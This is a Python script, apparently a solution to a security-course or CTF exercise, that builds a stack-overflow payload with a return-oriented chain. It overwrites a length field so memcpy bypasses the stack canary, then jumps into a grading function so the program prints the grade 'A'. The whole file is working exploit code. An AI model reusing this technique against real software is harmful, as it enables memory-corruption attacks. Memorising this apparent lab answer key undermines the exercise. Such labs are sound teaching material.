#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log (canary)."""
import sys


def q(x):
    """8字节小端。"""
    return x.to_bytes(8, "little")


POP6 = 0x40189a        # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
RET = 0x4018a4         # ret，用于栈对齐
GRADE_CHK = 0x401691   # grade_eval+0x1a: cmpl $4,-0x14(%rbp); ...; call printf@plt; ...; call fflush(stdout)
FOUR = 0x400044        # 只读段里值为4的dword（PT_PHDR的p_flags=PF_R），供cmpl比较

# 前128字节放在expression里，会被memcpy搬到saved RBP/返回地址处
# 依次是假saved RBP、POP6、六个pop值、RET、跳进grade_eval内部
# rbp设为FOUR+0x14，使[rbp-0x14]==4，grade_eval自己算出'A'并调用printf，随后fflush(stdout)
chain = q(0x4242424242424242)
chain += q(POP6)
chain += q(0)
chain += q(FOUR + 0x14)
chain += q(0)
chain += q(0)
chain += q(0)
chain += q(0)
chain += q(RET)
chain += q(GRADE_CHK)
chain += b"A" * (128 - len(chain))

# 128字节填满logMsg，再把f.len改成0xa0，让memcpy跳过Canary直接写到saved RBP处
payload = chain + b"C" * 128
payload += (0xA0).to_bytes(4, "little")
payload += b"\n"

sys.stdout.buffer.write(payload)
